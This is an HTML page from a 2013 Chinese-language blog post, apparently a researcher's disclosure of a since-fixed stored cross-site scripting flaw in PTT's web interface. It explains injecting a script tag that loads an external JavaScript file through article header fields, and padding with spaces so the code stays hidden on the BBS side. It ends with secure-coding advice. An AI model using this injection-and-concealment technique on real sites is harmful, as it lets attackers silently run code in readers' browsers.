@@ -1,0 +1,317 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>在 PTT 插 javascript - Shaolin.TW</title>
+  <meta name="author" content="shaolin">
+
+  
+  <meta name="description" content="註：本文發表時，PTT 官方已經修正這個問題 前言 幾天前從 Facebook 上看到一篇 PTT 的轉錄文章，因為該篇文章沒有斷行，讓我對 BBS 文章轉 HTML 的 parser 運作產生好奇，然後在研究過程中竟意外發現 PTT 可以插入 javascript： 像這樣在 BBS &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="http://feeds.feedburner.com/tech_shaolin" rel="alternate" title="Shaolin.TW" type="application/atom+xml">
+  <!-- Facebook Open Graph
+     Facebook Debugger: https://developers.facebook.com/tools/debug -->
+<meta property="og:title" content="在 PTT 插 javascript" /><meta itemprop="name" content="在 PTT 插 javascript" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/" />
+<meta property="og:description" content="註：本文發表時，PTT 官方已經修正這個問題 前言 幾天前從 Facebook 上看到一篇 PTT 的轉錄文章，因為該篇文章沒有斷行，讓我對 BBS 文章轉 HTML 的 parser 運作產生好奇，然後在研究過程中竟意外發現 PTT 可以插入 javascript： 像這樣在 BBS &hellip;" />
+
+<meta property="og:site_name" content="http://tech.shaolin.tw" />
+<meta property="article:published_time" content="2013-08-27 17:58:00 +0800" />
+
+<meta property="article:section" content="" />
+<meta itemprop="description" content="註：本文發表時，PTT 官方已經修正這個問題 前言 幾天前從 Facebook 上看到一篇 PTT 的轉錄文章，因為該篇文章沒有斷行，讓我對 BBS 文章轉 HTML 的 parser 運作產生好奇，然後在研究過程中竟意外發現 PTT 可以插入 javascript： 像這樣在 BBS &hellip;" />
+
+<!-- Combine multiple fonts into one request -->
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic|Patua+One|Yanone+Kaffeesatz" rel="stylesheet" type="text/css">
+<!-- jQuery -->
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+
+  
+  <script type="text/javascript">
+
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-323837-6', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+<body    class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Shaolin.TW</a></h1>
+  
+    <h2>shaolin's 20% time</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="http://feeds.feedburner.com/tech_shaolin" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="tech.shaolin.tw">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/"><i class="icon-home"></i>Home</a></li>
+  <li><a href="/archives"><i class="icon-book-alt"></i>Archives</a><span class="divider"></span></li>
+  <li><a href="/about"><i class="icon-user"></i>About</a><span class="divider"></span></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">在 PTT 插 Javascript</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-08-27T17:58:00+08:00" pubdate data-updated="true">August 27, 2013 17:58</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><strong>註：本文發表時，PTT 官方已經修正這個問題</strong></p>
+
+<h1>前言</h1>
+
+<p>幾天前從 Facebook 上看到一篇 <a href="http://www.ptt.cc/bbs/index.html">PTT</a> 的轉錄文章，因為該篇文章沒有斷行，讓我對 BBS 文章轉 HTML 的 parser 運作產生好奇，然後在研究過程中竟意外發現 PTT 可以插入 javascript：</p>
+
+<p>像這樣在 BBS 標題區塊加入 javascript 的文字
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/YT6MlFETQuxVGdu79EZA_bbs_1.png" alt="bbs_1.png" />
+轉成 html 時因為沒有過濾掉，在 web 介面上 javascript 就被正確執行
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/5HGitE8bQ8uSavfr11Sk_web_1.png" alt="web_1.png" />
+在 web 介面上看到的原文變成這樣
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/liWcCjPgQQOgPud0jms5_web_2.png" alt="web_2.png" /></p>
+
+<p>PTT 的文章常常在 Facebook 被轉載，擁有擴散率高的特性，如果被植入惡意程式，其實影響範圍不小。
+身為目標是維護世界和平的資安研究僧，我開始模擬駭客的思維，猜測駭客可能會關注下面兩點：</p>
+
+<ol>
+<li><p>此弱點可利用的長度，至少要放的下 <code>&lt;script src="http://data.shaolin.tw/js/ptt.js"&gt;&lt;/script&gt; (這是舉例，網址可以更短)</code> 這類的東西才可以做更多事情，不然只是跳出 alert 好像太虛了。</p></li>
+<li><p>猜測駭客都有為善不欲人知的特質，即使在 web 介面上看不出被插了 javascipt，但在 BBS 介面大喇喇的被所有人看到自己在這篇文章插 javascript， 應該會有些害羞吧！</p></li>
+</ol>
+
+
+<p>所以本篇就來想辦法看看有沒有辦法解決上面兩個問題吧！</p>
+
+<h1>思考與實作</h1>
+
+<p>前述第一點弱點可利用的長度應該不是什麼大問題，畢竟整塊作者、標題、時間都存在相同的問題，標題欄位要放個 4X 個字元是很足夠的。重點還是該如何在 BBS 介面不被讓人家發現寫了一長串跟內文無關的東西。</p>
+
+<p>那，該如何在 BBS 文章中隱藏那串怪異的程式碼，又必須把它放到作者、標題、時間那的區塊裡面呢？</p>
+
+<p>第一個想法，是利用鄉民低調最常使用的色碼，希望可以在 script 那串文字上面做出藍底藍字的效果，混在標題列就可以不被人發現有貓膩了。可惜的是，標題那塊不能使用色碼 XD</p>
+
+<p>第二個想法，是利用位移碼 + 色碼，希望能夠在文章內文寫下藍底藍字的 script，然後位移到標題藍色區塊，不但解決了第一個想法中標題區塊不能用色碼的問題，在文章內文寫 script 要多長就有多長也不怕不夠用，這真是太聰明的作法了！！！現在只擔心轉換 html 的程式會不會正確處理位移碼而已了，嗯嗯。
+興奮之餘趕快去測試了一下，痾，位移碼不能用了～～ 年輕人終究是年輕人，太天真惹XD</p>
+
+<p>最後我想到 BBS 一行可以存 512 個字元，而且在標題藍色區塊，超過 78 個字元的部份似乎都不會顯示。所以只要在標題區塊上任一欄向後補空白字元補滿 78 個字元，後面要放什麼東西都隨便，長度很夠，也不會被顯示出來。很簡單的作法，效果也最好！實作的方式如下面的影片：</p>
+
+<iframe width="420" height="315" src="//www.youtube.com/embed/bxDUbhxvqaQ" frameborder="0" allowfullscreen></iframe>
+
+
+<p>至於為什麼不隨便空 n ( n>78 )個空白就好了，而是要剛剛好讓前面是 78 個字元？因為 web 頁面超過 78 個字元就會換行，看起來會很怪，如下圖，藍色區塊多了一行
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/llyZudnSY6rZUnrRAvI3_one_more_line.png" alt="one_more_line.png" /></p>
+
+<p>最後成功的 html 長得大概像這樣，要放 iframe 或更多 html tag 都可以了
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/k32LGWUaSM21tRmaKWHf_src.png" alt="src.png" /></p>
+
+<h1>結論</h1>
+
+<p>本文首先利用了 PTT 轉 HTML 在標題區塊的小疏忽，在 web PTT 上成功插入了 javascript。
+接著，利用標題區塊在 BBS 上僅顯示前 78 個字元的特性，在 BBS 介面隱藏了惡意的程式碼。
+其實插 javascript 並不是一件稀有的事情，也不需要特別撰文描述，但很少會碰到需要隱藏這些 script 的狀況，所以特別分享之XD</p>
+
+<p>既然都發了這篇文，想要順便提一下一個觀念：『除非真的很確定，否則不要相信任何 input！』。身為程式開發者，當然也會覺得要做到這件事情超麻煩，但在開發的過程中，想想不同的 input 跑到你的程式碼中會變成什麼樣的結果，真的也是一種趣味。而且，這個觀念能帶來的會是安全的程式碼，是應該內化到每個開發者的重要準則阿！</p>
+
+<p>阿對了，我還要說，PTT 修正這個問題的速度超快的啦！寄信沒多久就解了，讚耶！</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">shaolin</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-08-27T17:58:00+08:00" pubdate data-updated="true">August 27, 2013 17:58</time>
+      
+
+
+    </p>
+    
+      <div class="social-share" style="line-height: 10px; margin: 20px 0;">
+  <div style="float: right;">
+    <div class="fb-like" data-href="http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
+  </div>
+  <a href="https://twitter.com/share?" class="twitter-share-button">Tweet</a>
+  <div class="g-plusone" data-size="medium"></div>
+  <script type="text/javascript">
+    (function() {
+      var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+      po.src = 'https://apis.google.com/js/platform.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+    })();
+  </script>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/posts/2013/08/05/wi-fi-positioning-system-spoofing-2/" title="Previous Post: Wi-Fi positioning system 欺騙 (2)">&laquo; Wi-Fi positioning system 欺騙 (2)</a>
+      
+      
+        <a class="basic-alignment right" href="/posts/2013/09/21/facebook-edit-post-api/" title="Next Post: Facebook 修改文章 API">Facebook 修改文章 API &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<p>
+  Copyright &copy; 2016 - shaolin<span class="theme-version">Dropbot 0.8</span>
+  <section class="contruction-wrap">
+    <div class="contruction"></div>
+  </section>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'tech-shaolin';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/';
+        var disqus_url = 'http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+  <script type="text/javascript">
+
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-323837-6', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+
+
+</body>
+</html>
